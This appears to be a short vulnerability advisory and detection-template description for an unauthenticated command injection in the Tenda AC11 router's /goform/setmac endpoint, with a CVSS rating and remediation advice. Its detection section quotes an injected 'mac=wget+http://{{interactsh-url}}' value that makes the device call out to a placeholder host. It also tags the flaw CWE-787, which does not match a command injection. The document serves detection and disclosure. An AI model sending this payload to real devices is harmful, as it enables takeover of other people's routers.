## Vulnerability
Tenda Router AC11 firmware is susceptible to remote command injection in the web-based management interface. An unauthenticated remote attacker can perform command injection attacks against an affected device via the `/goform/setmac` endpoint (CWE-787).

**CVSS 3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**Impact:** Successful exploitation could lead to unauthorized access, data exfiltration, and complete compromise of the affected router.  
**Remediation:** Apply the latest firmware update provided by Tenda.

## PoC / Detection
Classification: rce  
The template sends a raw POST request to `/goform/setmac` with form-urlencoded data containing a command injection payload (`mac=wget+http://{{interactsh-url}}`) mixed into wifiBasicCfg and other WiFi parameters. It verifies successful RCE by matching on an HTTP OOB interaction callback to the interactsh server.
